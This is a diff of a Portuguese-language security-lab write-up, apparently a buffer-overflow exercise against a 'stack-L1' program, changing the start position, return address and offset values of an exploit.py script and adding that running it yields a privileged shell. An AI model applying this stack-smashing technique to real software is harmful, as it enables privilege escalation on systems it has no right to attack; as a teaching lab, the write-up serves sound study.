@@ -89,13 +89,13 @@ shellcode= (
 De seguida, alterou-se o valor do start para guardar o valor do shell code no fim da lista.
 
 ```py
-start = 517-len(shellcode)
+start = 400
 ```
 
 Foi calculado o novo endereço de retorno que aponta para o código do shell a ser executado.
 
 ```py
-ret    = 0xffffcaf8 + start
+ret    = 0xffffcaf8 + 200
 ```
 
 Usando os dois endereços obtidos durante o debug, determinou-se a localização do endereço de retorno em relação ao início do array (offset)
@@ -104,6 +104,10 @@ Usando os dois endereços obtidos durante o debug, determinou-se a localização
 offset = 0xffffcaf8 - 0xffffca8c + 4
 ```
 
+Após executar o ficheiro ./exploit.py e ./stack-L1 conseguimos obter acesso a uma shell com permissões:
 
+![shell](Images/shell.png)
+
+## Task 4
 
 
